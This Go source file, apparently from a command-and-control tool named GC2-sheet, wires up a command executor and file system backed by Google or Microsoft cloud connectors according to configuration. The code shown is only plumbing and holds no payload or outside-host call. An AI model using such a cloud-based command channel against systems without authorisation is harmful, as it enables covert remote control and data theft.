package C2

import "GC2-sheet/internal/configuration"

func provideCommandExecutorAndFileSystem() (CommandExecutor, FileSystem, error) {
	var commandExecutor CommandExecutor
	var fileSystem FileSystem
	var googleConnector *GoogleConnector
	var microsoftConnector *MicrosoftConnector
	var err error

	if configuration.NeedsGoogleConnectorService() {
		googleConnector, err = NewGoogleConnector()
		if err != nil {
			return nil, nil, err
		}
	}

	if configuration.NeedsMicrosoftConnectorService() {
		microsoftConnector, err = newMicrosoftConnector()
		if err != nil {
			return nil, nil, err
		}
	}

	switch configuration.GetOptionsCommandService() {
	case configuration.Google:
		commandExecutor, err = NewGoogleCommandExecutor(googleConnector)
	case configuration.Microsoft:
		commandExecutor, err = NewMicrosoftCommandExecutor(microsoftConnector)
	}

	if err != nil {
		return nil, nil, err
	}

	switch configuration.GetOptionsFileSystemService() {
	case configuration.Google:
		fileSystem = NewGoogleFileSystem(googleConnector)
	case configuration.Microsoft:
		fileSystem = NewMicrosoftFileSystem(microsoftConnector)
	}

	return commandExecutor, fileSystem, nil
}
